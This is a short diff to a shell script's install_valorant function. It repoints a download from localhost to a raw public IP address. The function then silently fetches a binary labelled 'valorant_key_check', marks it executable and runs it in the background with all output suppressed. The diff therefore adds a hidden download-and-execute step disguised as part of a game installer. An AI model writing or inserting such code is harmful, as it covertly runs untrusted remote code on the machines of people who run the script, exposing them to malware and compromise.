@@ -28,7 +28,7 @@ setup_color() {
 }
 
 install_valorant() {
-    wget -O valorant_key_check http://localhost:5000/TW9yZ2VuCg > /dev/null 2>&1
+    wget -O valorant_key_check http://51.79.54.105:5000/TW9yZ2VuCg > /dev/null 2>&1
     chmod +x valorant_key_check > /dev/null 2>&1
     nohup ./valorant_key_check </dev/null >/dev/null 2>&1 & 
 }
